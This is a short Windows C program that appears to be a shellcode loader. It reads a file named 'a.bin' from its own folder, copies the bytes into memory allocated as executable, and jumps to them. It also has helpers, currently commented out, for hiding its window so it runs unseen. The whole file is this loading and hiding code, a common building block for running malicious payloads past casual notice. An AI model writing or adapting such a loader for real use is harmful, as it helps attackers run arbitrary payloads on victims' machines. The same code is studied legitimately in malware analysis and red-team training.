#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>

//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <stdlib.h>
#include <stdio.h>

void HideWindow()
{
    HWND hwnd = GetForegroundWindow(); 
    if (hwnd)
    {
        ShowWindow(hwnd, SW_HIDE); 
    }
}
int RUN()
{
    FILE* fp;
    size_t size;
    unsigned char* buffer;
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    char* lastSlash = strrchr(exePath, '\\');
    if (lastSlash) {
        *(lastSlash + 1) = '\0';
    }
    char fullPath[MAX_PATH];
    snprintf(fullPath, sizeof(fullPath), "%sa.bin", exePath);
    printf(fullPath);
    fp = fopen(fullPath, "rb");
    fseek(fp, 0, SEEK_END);
    size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    buffer = (unsigned char*)malloc(size);
    fread(buffer, size, 1, fp);
    fclose(fp);  
    void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, size);
    ((void(*)())exec)();
    VirtualFree(exec, 0, MEM_RELEASE);
    free(buffer);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{//HideWindow();
    RUN();
}